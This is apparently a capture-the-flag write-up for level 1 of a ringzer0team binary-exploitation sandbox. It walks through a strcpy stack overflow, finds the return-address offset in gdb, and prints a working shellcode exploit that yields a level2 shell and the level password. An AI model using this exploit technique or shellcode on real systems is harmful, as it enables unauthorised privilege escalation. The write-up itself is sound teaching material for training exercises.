@@ -1,0 +1,111 @@
+Pwnage Linux level 1/15 Writeup
+
+So, just ssh'd into the box, we're greated with a readme file in level1 home directory, let's read it:
+
+“Welcom to ringzer0team.com binary sandbox!
+
+For help, come see us on IRC (irc.smashthestack.org #ringzer0team)
+
+Some things you must know:
+  - Levels are in /levels
+  - Home folders are readable only. Create a folder in /tmp to build your exploits.
+  - You can scp files on this box but can't reach internet from it.
+  - Levels passwords are in ~/.pass. Your goal is to reach it to levelup!
+  - Submit your flags on the website!
+
+Enjoy!”
+
+Ok, so our target is to read level2 flag/password in /home/level2/.pass;
+looking in /levels (the pwnable binaries' folder), we find a “level1” executable,
+owned by user level2 and executable by us and a “level1.c”, it's source code:
+
+“/* wutdo */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+    char buf[1024];
+        
+    strcpy(buf, argv[1]);
+    return 0;
+}”
+
+So it seems we have a stack based buffer overflow when the first argument got 
+strcpy'd (no maximum number of character to copy, so no bounds checking) to buf.
+
+Let's fire up gdb and take better look at it.
+
+Assuming stored EIP to be located 2-3 words (8-12 bytes) above the end of buf,
+our first try would be set argv[1] to 1024 'A's, 8 'B's, 4 'C's 4 'D's 
+(python could be very useful here) and we get:
+
+“
+Program received signal SIGSEGV, Segmentation fault.
+0x44444444 in ?? ()
+”
+
+Very good, so we get EIP at 1036 bytes.
+Now we need to know were to jump, the most obvious choice is “buf” itself, so
+let's find its position in memory (we would need to place a breakpoint somewere in main,
+to be able to interact with gdb in execution context):
+
+“
+(gdb) p &buf
+$1 = (char (*)[1024]) 0xbfffef80
+”
+
+So let's try it first with an int3, our buffer will be: 
+
+'0xcc' * 24 + A * 1000 + 'B' * 12 + buf_address
+
+(remember x86 is little endian, so the order of the bytes in the address must be reversed).
+
+Result:
+
+“
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0xbfffef81 in ?? ()
+”
+
+It works.
+
+Now, we only need to chose our favorite shellcode and put it in place,
+for example I used http://shell-storm.org/shellcode/files/shellcode-841.php.
+
+Our final input will be:
+
+[nop_sled] [shellcode][junk][ret_address]
+
+or, in detail:
+
+'\x90'*50 + shellcode + 'A'*(1036 - 50 - shellcode length) + '\x80\xef\xff\xbf'
+
+And, executing it:
+
+“
+Starting program: /levels/level1 $(python -c "print '\x90'*50 + 
+'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'A'*(1036-71) + '\x80\xef\xff\xbf'")
+process 29051 is executing new program: /bin/dash
+”
+
+and, launching it out of gdb:
+
+“
+./level1 `python -c "print '\x90' * 50 +
+'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'A'*(1036-71) + '\x80\xef\xff\xbf'"`
+Segmentation fault
+”
+
+Oops… Not good, let's try to adjusting the offsets and the nop sled a little bit:
+
+“
+level1@rzt-bin01:/levels$ ./level1 `python -c "print '\x90' * 100 +
+'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'A'*(1036-121) + '\xa0\xef\xff\xbf'"`
+$ whoami 
+level2
+$ cat /home/level2/.pass
+TJyK9lJwZrgqc8nIIF6o
+$
+”
